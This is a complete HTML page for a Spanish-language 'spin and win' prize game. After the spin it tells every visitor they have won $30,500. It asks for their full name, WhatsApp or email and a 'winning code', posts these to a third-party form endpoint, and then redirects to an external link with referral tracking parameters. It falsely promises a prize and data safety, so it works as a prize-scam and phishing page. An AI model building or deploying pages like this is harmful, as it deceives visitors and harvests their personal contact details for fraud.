<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gira y Gana</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>

  <div class="logo-container">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTid7FRnGKkjnH24tmXEDEiGGsbz4quMV7tyNw9367Q3Q&s" alt="Logo" class="logo">
  </div>

  <div id="game-section">
    <h1>Gira y Gana</h1>
    <p>¡Gírala! — Premios emocionantes te esperan.</p>

    <div class="wheel-container">
      <div class="wheel" id="wheel">GIRA</div>
      <div class="pointer">▼</div>
    </div>

    <button id="spinBtn">¡Girar Ahora!</button>

    <p id="result"></p>
  </div>

  <div id="form-section" style="display: none;">
    <h2>¡Felicidades!</h2>
    <p class="prize-text">
      ¡GANASTE $30,500!<br>
      Completa los 3 campos para reclamar tu premio.
    </p>

    <form id="claimForm" action="https://formspree.io/f/xzdrqyke" method="POST">
      <input type="text" name="nombre" placeholder="Nombre Completo" required>
      <input type="text" name="contacto" placeholder="WhatsApp o Email" required>
      <input type="text" name="codigo_ganancia" placeholder="Código de Ganancia" required>
      <input type="hidden" name="premio" value="Ganaste $30,500">

      <button type="submit" id="submitBtn">Reclamar Premio</button>
    </form>

    <p class="small-note">Tus datos están seguros — te contactaremos pronto.</p>
  </div>

  <script src="script.js"></script>

  <!-- Form submission handler with redirect -->
  <script>
    document.getElementById('claimForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const form = event.target;
      const submitBtn = document.getElementById('submitBtn');
      submitBtn.disabled = true;
      submitBtn.textContent = "Enviando...";

      const formData = new FormData(form);

      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => {
        if (response.ok) {
          // Redirect after success
          window.location.href = "https://www.latgree.com/?user=27977&ref=44947";
        } else {
          alert("Error al enviar el formulario. Inténtalo de nuevo.");
          submitBtn.disabled = false;
          submitBtn.textContent = "Reclamar Premio";
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert("Problema de conexión. Verifica tu internet.");
        submitBtn.disabled = false;
        submitBtn.textContent = "Reclamar Premio";
      });
    });
  </script>

</body>
</html>
